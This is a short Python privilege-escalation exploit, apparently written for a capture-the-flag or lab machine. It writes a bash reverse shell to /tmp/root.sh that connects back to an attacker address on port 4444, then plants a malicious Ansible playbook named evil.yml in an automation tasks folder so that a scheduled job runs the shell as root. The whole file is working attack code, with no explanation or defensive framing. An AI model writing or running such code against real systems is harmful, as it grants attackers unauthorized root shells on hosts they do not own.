import sys
import os
import time

attackerIp = '10.10.16.31'
attackerPort = 4444

def rootFile():
    sh = open("/tmp/root.sh", "w")
    sh.write(f"/bin/bash -i >& /dev/tcp/{attackerIp}/{attackerPort} 0>&1")
    sh.close()

def ymlFile():
    yml = open("/opt/automation/tasks/evil.yml", "w")
    yml.write("- hosts: localhost\n\n  tasks:\n\n    - name: RShell\n\n      command: sudo bash /tmp/root.sh")
    yml.close()

def exploit():
	os.system('chmod +x /tmp/root.sh')
	rootFile()
	for i in range(5):
		ymlFile()
		os.system('ansible')
		time.sleep(10)


exploit()

